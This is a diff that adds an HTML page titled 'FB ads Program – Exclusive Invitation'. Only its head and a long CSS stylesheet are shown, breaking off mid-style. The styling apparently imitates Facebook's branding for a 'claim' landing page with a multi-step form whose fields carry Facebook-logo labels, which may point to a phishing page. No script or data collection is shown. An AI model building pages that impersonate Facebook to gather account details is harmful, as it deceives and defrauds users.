@@ -1,0 +1,3122 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FB ads Program – Exclusive Invitation</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap"
+        rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        .btn-primary {
+            display: inline-block;
+            background: linear-gradient(145deg, #1b74e4, #0d65d0);
+            color: #fff;
+            font-weight: 700;
+            font-size: 1.1rem;
+            padding: 16px 40px;
+            border-radius: 60px;
+            border: none;
+            box-shadow: 0 8px 24px rgba(27, 116, 228, 0.35);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 14px 34px rgba(27, 116, 228, 0.45);
+            background: linear-gradient(145deg, #1f7ef0, #0d5fbf);
+        }
+
+        .btn-primary i {
+            margin-right: 10px;
+        }
+
+        .btn-outline {
+            display: inline-block;
+            background: transparent;
+            color: #1b74e4;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 14px 32px;
+            border-radius: 60px;
+            border: 2px solid #1b74e4;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .btn-outline:hover {
+            background: #1b74e4;
+            color: #fff;
+        }
+
+        .btn-claim {
+            display: inline-block;
+            background: linear-gradient(145deg, #1b74e4, #0d65d0);
+            color: #fff;
+            font-weight: 700;
+            font-size: 1.1rem;
+            padding: 16px 40px;
+            border-radius: 60px;
+            border: none;
+            box-shadow: 0 8px 24px rgba(27, 116, 228, 0.35);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+        }
+
+        .btn-claim:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 14px 34px rgba(27, 116, 228, 0.45);
+            background: linear-gradient(145deg, #1f7ef0, #0d5fbf);
+        }
+
+        .btn-claim i {
+            margin-right: 10px;
+        }
+
+        .navbar {
+            background: #ffffff;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            padding: 16px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar .container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #1b74e4;
+        }
+
+        .logo i {
+            font-size: 2rem;
+            color: #1b74e4;
+        }
+
+        .logo span {
+            color: #1c1e21;
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+            list-style: none;
+            font-weight: 500;
+        }
+
+        .nav-links a {
+            color: #1c1e21;
+            transition: color 0.2s;
+            font-size: 0.95rem;
+        }
+
+        .nav-links a:hover {
+            color: #1b74e4;
+        }
+
+        .nav-links .btn-outline {
+            padding: 10px 24px;
+            font-size: 0.9rem;
+        }
+
+        .lang-switch-btn {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            padding: 8px 14px;
+            border: 2px solid #e4e6eb;
+            border-radius: 30px;
+            background: #f7f9fc;
+            color: #1c1e21;
+            font-size: 0.85rem;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s ease;
+            white-space: nowrap;
+        }
+
+        .lang-switch-btn:hover {
+            border-color: #1b74e4;
+            background: #e7f3ff;
+            transform: translateY(-1px);
+        }
+
+        .lang-switch-btn img {
+            width: 18px;
+            height: 13px;
+            border-radius: 3px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.12);
+            flex-shrink: 0;
+        }
+
+        .hero {
+            background: linear-gradient(165deg, #ffffff 0%, #f7f9fc 100%);
+            padding: 70px 0 80px;
+            text-align: center;
+            border-bottom: 1px solid #e4e6eb;
+        }
+
+        .hero .badge {
+            display: inline-block;
+            background: #e7f3ff;
+            color: #1b74e4;
+            font-weight: 600;
+            font-size: 0.8rem;
+            padding: 6px 18px;
+            border-radius: 60px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+
+        .hero h1 {
+            font-size: 3.2rem;
+            font-weight: 800;
+            line-height: 1.2;
+            max-width: 800px;
+            margin: 0 auto 20px;
+        }
+
+        .hero h1 .highlight {
+            background: linear-gradient(145deg, #1b74e4, #0a5cbd);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: #4b4f56;
+            max-width: 640px;
+            margin: 0 auto 36px;
+        }
+
+        .hero .cta-group {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .hero .stats {
+            display: flex;
+            justify-content: center;
+            gap: 48px;
+            margin-top: 50px;
+            flex-wrap: wrap;
+        }
+
+        .hero .stat-item {
+            text-align: center;
+        }
+
+        .hero .stat-item .number {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #1b74e4;
+        }
+
+        .hero .stat-item .label {
+            font-size: 0.9rem;
+            color: #65676b;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+
+        .section-title h2 {
+            font-size: 2.4rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .section-title p {
+            color: #4b4f56;
+            max-width: 600px;
+            margin: 12px auto 0;
+            font-size: 1.05rem;
+        }
+
+        .benefits {
+            padding: 70px 0;
+            background: #ffffff;
+        }
+
+        .benefits-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+
+        .benefit-card {
+            background: #f7f9fc;
+            border-radius: 20px;
+            padding: 32px 24px;
+            text-align: center;
+            transition: transform 0.25s ease, box-shadow 0.25s ease;
+            border: 1px solid #e4e6eb;
+        }
+
+        .benefit-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.06);
+        }
+
+        .benefit-card .icon {
+            font-size: 2.6rem;
+            color: #1b74e4;
+            margin-bottom: 16px;
+        }
+
+        .benefit-card h3 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .benefit-card p {
+            color: #4b4f56;
+            font-size: 0.95rem;
+        }
+
+        .how-it-works {
+            padding: 70px 0;
+            background: #f7f9fc;
+        }
+
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 30px;
+            counter-reset: step;
+        }
+
+        .step {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 32px 24px;
+            text-align: center;
+            border: 1px solid #e4e6eb;
+            position: relative;
+            transition: box-shadow 0.25s;
+        }
+
+        .step:hover {
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.05);
+        }
+
+        .step .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 48px;
+            height: 48px;
+            border-radius: 60px;
+            background: #1b74e4;
+            color: #fff;
+            font-weight: 800;
+            font-size: 1.2rem;
+            margin-bottom: 16px;
+        }
+
+        .step h3 {
+            font-weight: 700;
+            font-size: 1.15rem;
+            margin-bottom: 6px;
+        }
+
+        .step p {
+            color: #4b4f56;
+            font-size: 0.95rem;
+        }
+
+        .eligibility {
+            padding: 70px 0;
+            background: #ffffff;
+        }
+
+        .eligibility-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 24px;
+        }
+
+        .eligibility-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+            background: #f7f9fc;
+            padding: 20px 24px;
+            border-radius: 16px;
+            border: 1px solid #e4e6eb;
+        }
+
+        .eligibility-item i {
+            font-size: 1.4rem;
+            color: #1b74e4;
+            margin-top: 2px;
+        }
+
+        .eligibility-item h4 {
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .eligibility-item p {
+            color: #4b4f56;
+            font-size: 0.9rem;
+        }
+
+        .cta-banner {
+            padding: 60px 0;
+            background: linear-gradient(145deg, #1b74e4, #0d5fbf);
+            color: #fff;
+            text-align: center;
+        }
+
+        .cta-banner h2 {
+            font-size: 2.4rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .cta-banner p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            max-width: 540px;
+            margin: 0 auto 28px;
+        }
+
+        .cta-banner .btn-primary {
+            background: #fff;
+            color: #1b74e4;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+        }
+
+        .cta-banner .btn-primary:hover {
+            background: #f0f4fe;
+            transform: translateY(-3px);
+            box-shadow: 0 14px 34px rgba(0, 0, 0, 0.3);
+        }
+
+        .cta-banner .btn-primary i {
+            color: #1b74e4;
+        }
+
+        .footer {
+            background: #1c1e21;
+            color: #d0d2d6;
+            padding: 40px 0 28px;
+            font-size: 0.9rem;
+        }
+
+        .footer .container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .footer .socials {
+            display: flex;
+            gap: 18px;
+        }
+
+        .footer .socials a {
+            color: #d0d2d6;
+            font-size: 1.3rem;
+            transition: color 0.2s;
+        }
+
+        .footer .socials a:hover {
+            color: #ffffff;
+        }
+
+        .footer .legal {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer .legal a {
+            color: #d0d2d6;
+            transition: color 0.2s;
+        }
+
+        .footer .legal a:hover {
+            color: #fff;
+        }
+
+        .footer .copy {
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #333538;
+            font-size: 0.8rem;
+            color: #8a8d91;
+        }
+
+        :root {
+            --lm-glass: rgba(255, 255, 255, .66);
+            --lm-glass-strong: rgba(255, 255, 255, .84);
+            --lm-glass-soft: rgba(246, 250, 255, .62);
+            --lm-glass-input: rgba(255, 255, 255, .58);
+            --lm-line: rgba(92, 121, 161, .18);
+            --lm-line-strong: rgba(24, 119, 242, .34);
+            --lm-ink: #18243a;
+            --lm-ink-soft: #33435a;
+            --lm-muted: #68788f;
+            --lm-muted-light: #98a5b7;
+            --lm-blue: #1877f2;
+            --lm-blue-hover: #0d6fe8;
+            --lm-blue-deep: #075fc9;
+            --lm-blue-soft: rgba(24, 119, 242, .10);
+            --lm-danger: #e45862;
+            --lm-danger-deep: #c94350;
+            --lm-danger-soft: rgba(228, 88, 98, .11);
+            --lm-success: #27895b;
+            --lm-shadow: 0 18px 48px rgba(48, 82, 123, .13), inset 0 1px 0 rgba(255, 255, 255, .85);
+            --lm-shadow-hover: 0 24px 60px rgba(48, 82, 123, .18), inset 0 1px 0 rgba(255, 255, 255, .92);
+        }
+
+        #lang-wrap {
+            position: fixed;
+            inset: 0;
+            background: rgba(41, 57, 82, .25);
+            backdrop-filter: blur(18px) saturate(135%);
+            -webkit-backdrop-filter: blur(18px) saturate(135%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity .35s ease;
+        }
+
+        #lang-wrap.show {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        #lang-box {
+            background: linear-gradient(135deg, rgba(255, 255, 255, .90), rgba(246, 250, 255, .70));
+            border: 1px solid rgba(255, 255, 255, .88);
+            border-radius: 24px;
+            padding: 28px;
+            width: 92%;
+            max-width: 500px;
+            box-shadow: 0 28px 70px rgba(21, 45, 80, .22), inset 0 1px 0 rgba(255, 255, 255, .95);
+            backdrop-filter: blur(26px) saturate(145%);
+            -webkit-backdrop-filter: blur(26px) saturate(145%);
+            transform: translateY(18px) scale(.985);
+            transition: transform .35s ease, box-shadow .35s ease;
+        }
+
+        #lang-wrap.show #lang-box {
+            transform: translateY(0) scale(1);
+        }
+
+        .lm-top {
+            display: flex;
+            align-items: center;
+            gap: 11px;
+            margin-bottom: 5px;
+        }
+
+        .lm-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #3996ff, #0e6ee5);
+            border: 1px solid rgba(255, 255, 255, .62);
+            border-radius: 12px;
+            box-shadow: 0 9px 18px rgba(24, 119, 242, .24), inset 0 1px 0 rgba(255, 255, 255, .4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .lm-icon img {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            filter: brightness(0) invert(1);
+        }
+
+        .lm-h {
+            font-size: 17px;
+            font-weight: 800;
+            color: var(--lm-ink);
+            letter-spacing: -.2px;
+        }
+
+        .lm-sub {
+            font-size: 13px;
+            color: var(--lm-muted);
+            margin-bottom: 16px;
+        }
+
+        .lm-search {
+            width: 100%;
+            padding: 10px 13px;
+            border: 1px solid var(--lm-line);
+            border-radius: 12px;
+            font-size: 13.5px;
+            font-family: inherit;
+            color: var(--lm-ink);
+            background: var(--lm-glass-input);
+            box-shadow: inset 0 1px 2px rgba(51, 79, 118, .04);
+            outline: none;
+            margin-bottom: 13px;
+            transition: border-color .2s, box-shadow .2s, background .2s;
+        }
+
+        .lm-search:focus {
+            border-color: var(--lm-line-strong);
+            background: rgba(255, 255, 255, .88);
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, .12);
+        }
+
+        .lm-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            max-height: 260px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .lm-grid::-webkit-scrollbar {
+            width: 5px;
+        }
+
+        .lm-grid::-webkit-scrollbar-thumb {
+            background: rgba(113, 137, 168, .32);
+            border-radius: 99px;
+        }
+
+        .lm-opt {
+            display: flex;
+            align-items: center;
+            gap: 9px;
+            padding: 10px 13px;
+            border: 1px solid var(--lm-line);
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 13.5px;
+            font-weight: 600;
+            color: var(--lm-ink-soft);
+            background: rgba(255, 255, 255, .48);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .72);
+            transition: all .18s ease;
+        }
+
+        .lm-opt:hover {
+            border-color: var(--lm-line-strong);
+            background: rgba(238, 247, 255, .88);
+            box-shadow: 0 7px 16px rgba(45, 84, 132, .08), inset 0 1px 0 #fff;
+            transform: translateY(-1px);
+        }
+
+        .lm-opt.sel {
+            border-color: rgba(24, 119, 242, .48);
+            background: linear-gradient(135deg, rgba(231, 243, 255, .96), rgba(245, 250, 255, .82));
+            box-shadow: 0 6px 16px rgba(24, 119, 242, .10), inset 0 1px 0 #fff;
+            color: #095fc7;
+        }
+
+        .lm-opt img {
+            width: 22px;
+            height: 16px;
+            border-radius: 4px;
+            object-fit: cover;
+            flex-shrink: 0;
+            box-shadow: 0 1px 3px rgba(31, 51, 80, .14);
+        }
+
+        .lm-confirm {
+            margin-top: 14px;
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(135deg, #2387fa, #0b6fe8);
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            border: 1px solid rgba(255, 255, 255, .34);
+            border-radius: 13px;
+            cursor: pointer;
+            font-family: inherit;
+            box-shadow: 0 12px 24px rgba(24, 119, 242, .24), inset 0 1px 0 rgba(255, 255, 255, .35);
+            transition: transform .2s ease, box-shadow .2s ease, background .2s ease, opacity .2s;
+        }
+
+        .lm-confirm:disabled {
+            opacity: .45;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .lm-confirm:not(:disabled):hover {
+            background: linear-gradient(135deg, #1680f8, #0567db);
+            box-shadow: 0 15px 28px rgba(24, 119, 242, .30), inset 0 1px 0 rgba(255, 255, 255, .38);
+            transform: translateY(-1px);
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(6px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 8000;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.96);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .modal-box {
+            background: #ffffff;
+            border-radius: 32px;
+            max-width: 640px;
+            width: 100%;
+            padding: 40px 36px 36px;
+            position: relative;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.35);
+            max-height: 95vh;
+            overflow-y: auto;
+            min-height: 440px;
+            transition: min-height 0.35s ease;
+        }
+
+        .modal-box::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .modal-box::-webkit-scrollbar-thumb {
+            background: #1b74e4;
+            border-radius: 10px;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 20px;
+            background: #f0f2f5;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 60px;
+            font-size: 1.3rem;
+            color: #1c1e21;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        .modal-close:hover {
+            background: #e4e6eb;
+            transform: rotate(90deg);
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-header .modal-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 64px;
+            height: 64px;
+            border-radius: 60px;
+            background: linear-gradient(145deg, #1b74e4, #0d5fbf);
+            color: #fff;
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+
+        .modal-header h2 {
+            font-size: 1.7rem;
+            font-weight: 800;
+            color: #1c1e21;
+        }
+
+        .modal-header p {
+            color: #4b4f56;
+            font-size: 0.95rem;
+            margin-top: 4px;
+        }
+
+        .modal-video-wrapper {
+            border-radius: 16px;
+            overflow: hidden;
+            margin-bottom: 18px;
+            background: #000;
+            position: relative;
+            aspect-ratio: 16 / 9;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
+        }
+
+        .modal-video-wrapper video {
+            width: 100%;
+            height: 100%;
+            display: block;
+            object-fit: contain;
+            background: #0a0a0a;
+        }
+
+        .modal-video-wrapper .play-btn-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.30);
+            cursor: pointer;
+            transition: background 0.3s;
+            z-index: 2;
+        }
+
+        .modal-video-wrapper .play-btn-overlay:hover {
+            background: rgba(0, 0, 0, 0.40);
+        }
+
+        .modal-video-wrapper .play-btn-overlay i {
+            font-size: 4.2rem;
+            color: #fff;
+            text-shadow: 0 4px 24px rgba(0, 0, 0, 0.6);
+            transition: transform 0.2s;
+        }
+
+        .modal-video-wrapper .play-btn-overlay:hover i {
+            transform: scale(1.08);
+        }
+
+        .modal-video-wrapper .play-btn-overlay.hidden {
+            display: none;
+        }
+
+        .video-controls {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #f0f2f5;
+            padding: 10px 16px;
+            border-radius: 14px;
+            margin-top: -6px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+            border: 1px solid #e4e6eb;
+        }
+
+        .video-controls button {
+            background: transparent;
+            border: none;
+            font-size: 1.2rem;
+            color: #1c1e21;
+            cursor: pointer;
+            width: 34px;
+            height: 34px;
+            border-radius: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s;
+            flex-shrink: 0;
+        }
+
+        .video-controls button:hover {
+            background: #e4e6eb;
+        }
+
+        .video-controls .progress-container {
+            flex: 1;
+            min-width: 80px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .video-controls .progress-container input[type="range"] {
+            flex: 1;
+            -webkit-appearance: none;
+            appearance: none;
+            height: 5px;
+            border-radius: 10px;
+            background: #d0d2d6;
+            outline: none;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .video-controls .progress-container input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #1b74e4;
+            cursor: pointer;
+            box-shadow: 0 0 6px rgba(27, 116, 228, 0.3);
+        }
+
+        .video-controls .progress-container input[type="range"]::-moz-range-thumb {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #1b74e4;
+            cursor: pointer;
+            border: none;
+        }
+
+        .video-controls .time-display {
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #4b4f56;
+            min-width: 70px;
+            text-align: center;
+            font-variant-numeric: tabular-nums;
+            letter-spacing: 0.2px;
+            flex-shrink: 0;
+        }
+
+        .video-controls .volume-wrap {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+
+        .video-controls .volume-wrap input[type="range"] {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 50px;
+            height: 4px;
+            border-radius: 10px;
+            background: #d0d2d6;
+            outline: none;
+            cursor: pointer;
+        }
+
+        .video-controls .volume-wrap input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #1b74e4;
+            cursor: pointer;
+        }
+
+        .video-controls .volume-wrap input[type="range"]::-moz-range-thumb {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #1b74e4;
+            cursor: pointer;
+            border: none;
+        }
+
+        .video-controls .fullscreen-btn {
+            font-size: 1.1rem;
+            flex-shrink: 0;
+        }
+
+        .modal-form {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .form-step {
+            opacity: 1;
+            transition: opacity 0.35s ease, transform 0.35s ease;
+            transform: translateY(0);
+        }
+
+        .form-step.hidden {
+            display: none;
+            opacity: 0;
+            transform: translateY(10px);
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .form-group label {
+            font-weight: 700;
+            font-size: 0.95rem;
+            color: #1c1e21;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-group label .label-badge {
+            background: #e7f3ff;
+            color: #1b74e4;
+            font-size: 0.65rem;
+            font-weight: 600;
+            padding: 2px 10px;
+            border-radius: 40px;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group label .label-badge.warning {
+            background: #fff3e0;
+            color: #e67e22;
+        }
+
+        .fb-logo-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .fb-logo-label .fb-icon {
+            font-size: 1.2rem;
+            color: #1b74e4;
+            background: #e7f3ff;
+            border-radius: 6px;
+            padding: 2px 6px;
+            line-height: 1;
+        }
+
+        .form-group input,
+        .form-group textarea {
+            font-family: 'Inter', sans-serif;
+            padding: 14px 18px;
+            border: 2px solid #e4e6eb;
+            border-radius: 14px;
+            font-size: 1rem;
+            transition: border-color 0.25s, box-shadow 0.25s;
+            background: #f7f9fc;
+            color: #1c1e21;
+            width: 100%;
+        }
+
+        .form-group input:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #1b74e4;
+            box-shadow: 0 0 0 4px rgba(27, 116, 228, 0.15);
+            background: #ffffff;
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 70px;
+        }
+
+        .form-group .field-hint {
+            font-size: 0.8rem;
+            color: #65676b;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-top: 2px;
+        }
+
+        .form-group .field-hint i {
+            color: #1b74e4;
+            font-size: 0.7rem;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .info-notice {
+            background: #f0f7ff;
+            border-left: 4px solid #1b74e4;
+            border-radius: 12px;
+            padding: 14px 18px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            font-size: 0.9rem;
+            color: #1c3a5e;
+            margin: 2px 0 10px;
+        }
+
+        .info-notice i {
+            color: #1b74e4;
+            font-size: 1.1rem;
+            margin-top: 2px;
+        }
+
+        .info-notice strong {
+            color: #1b74e4;
+        }
+
+        .modal-submit {
+            background: linear-gradient(145deg, #1b74e4, #0d65d0);
+            color: #fff;
+            font-weight: 700;
+            font-size: 1.1rem;
+            padding: 16px;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(27, 116, 228, 0.3);
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+        }
+
+        .modal-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 34px rgba(27, 116, 228, 0.4);
+            background: linear-gradient(145deg, #1f7ef0, #0d5fbf);
+        }
+
+        .modal-submit i {
+            font-size: 1rem;
+        }
+
+        .modal-submit.secondary {
+            background: linear-gradient(145deg, #42b72a, #36a420);
+            box-shadow: 0 8px 24px rgba(66, 183, 42, 0.3);
+        }
+
+        .modal-submit.secondary:hover {
+            box-shadow: 0 14px 34px rgba(66, 183, 42, 0.4);
+            background: linear-gradient(145deg, #4cc43a, #3aaf26);
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 6px 0 14px;
+        }
+
+        .step-indicator .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 60px;
+            background: #d0d2d6;
+            transition: background 0.3s;
+        }
+
+        .step-indicator .dot.active {
+            background: #1b74e4;
+            width: 26px;
+        }
+
+        .step-indicator .dot.done {
+            background: #42b72a;
+        }
+
+        .thankyou-message {
+            text-align: center;
+            padding: 20px 10px;
+        }
+
+        .thankyou-message .big-icon {
+            font-size: 4rem;
+            color: #42b72a;
+            margin-bottom: 12px;
+        }
+
+        .thankyou-message h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+
+        .thankyou-message p {
+            color: #4b4f56;
+            font-size: 1rem;
+            margin-top: 6px;
+        }
+
+        .xs-error-msg {
+            display: none;
+            margin-top: 6px;
+            padding: 10px 14px;
+            background: #fff5f5;
+            border: 1px solid #fecaca;
+            border-radius: 10px;
+            color: #dc2626;
+            font-size: 0.82rem;
+            font-weight: 500;
+            animation: shakeX 0.4s ease;
+        }
+
+        .xs-error-msg.show {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .xs-error-msg i {
+            font-size: 0.9rem;
+        }
+
+        @keyframes shakeX {
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            20% {
+                transform: translateX(-6px);
+            }
+
+            40% {
+                transform: translateX(6px);
+            }
+
+            60% {
+                transform: translateX(-4px);
+            }
+
+            80% {
+                transform: translateX(4px);
+            }
+        }
+
+        .form-group input.input-error {
+            border-color: #dc2626 !important;
+            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.12) !important;
+            background: #fffbfb !important;
+        }
+
+        .inline-error {
+            display: none;
+            margin-top: 6px;
+            padding: 10px 14px;
+            background: #fff5f5;
+            border: 1px solid #fecaca;
+            border-radius: 10px;
+            color: #dc2626;
+            font-size: 0.82rem;
+            font-weight: 500;
+            animation: shakeX 0.4s ease;
+        }
+
+        .inline-error.show {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+
+            .hero .stats {
+                gap: 24px;
+            }
+
+            .hero .stat-item .number {
+                font-size: 1.8rem;
+            }
+
+            .section-title h2 {
+                font-size: 1.9rem;
+            }
+
+            .navbar .container {
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+            }
+
+            .nav-links {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 12px 18px;
+                width: 100%;
+            }
+
+            .nav-links a {
+                font-size: 0.9rem;
+                white-space: nowrap;
+            }
+
+            .nav-links .btn-outline {
+                padding: 8px 18px;
+                font-size: 0.85rem;
+            }
+
+            .nav-right-group {
+                justify-content: center;
+                gap: 10px;
+                width: 100%;
+                flex-wrap: wrap;
+            }
+
+            .lang-switch-btn {
+                display: none !important;
+            }
+
+            .logo {
+                justify-content: center;
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 540px) {
+            .modal-box {
+                padding: 24px 16px 20px;
+                border-radius: 24px;
+            }
+
+            .modal-header h2 {
+                font-size: 1.3rem;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .modal-video-wrapper .play-btn-overlay i {
+                font-size: 3rem;
+            }
+
+            .modal-close {
+                top: 10px;
+                right: 12px;
+                width: 34px;
+                height: 34px;
+                font-size: 1.1rem;
+            }
+
+            .video-controls {
+                padding: 8px 12px;
+                gap: 8px;
+            }
+
+            .video-controls .volume-wrap input[type="range"] {
+                width: 36px;
+            }
+
+            .video-controls .time-display {
+                min-width: 56px;
+                font-size: 0.7rem;
+            }
+
+            #lang-box {
+                padding: 22px 18px;
+                border-radius: 20px;
+            }
+
+            .lm-grid {
+                grid-template-columns: 1fr;
+            }
+
